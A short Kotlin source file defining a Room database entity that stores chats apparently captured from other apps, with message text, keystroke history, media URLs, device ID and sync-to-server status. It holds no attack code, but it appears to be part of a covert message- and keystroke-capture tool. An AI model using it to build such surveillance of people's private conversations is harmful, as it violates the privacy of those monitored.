package com.chats.capture.models

import androidx.room.Entity
import androidx.room.Index
import androidx.room.PrimaryKey
import java.util.UUID

@Entity(
    tableName = "chats",
    indices = [
        Index(value = ["appPackage"]),
        Index(value = ["chatIdentifier"]),
        Index(value = ["timestamp"]),
        Index(value = ["synced"]),
        Index(value = ["deviceId"])
    ]
)
data class ChatData(
    @PrimaryKey val id: String = UUID.randomUUID().toString(),
    val deviceId: String? = null,
    val appPackage: String,
    val appName: String,
    val chatIdentifier: String?,
    val text: String,
    val keyHistory: List<String>? = null,
    val mediaUrls: List<String>? = null,
    val timestamp: Long = System.currentTimeMillis(),
    val synced: Boolean = false,
    val syncAttempts: Int = 0,
    val lastSyncAttempt: Long? = null,
    val errorMessage: String? = null
)
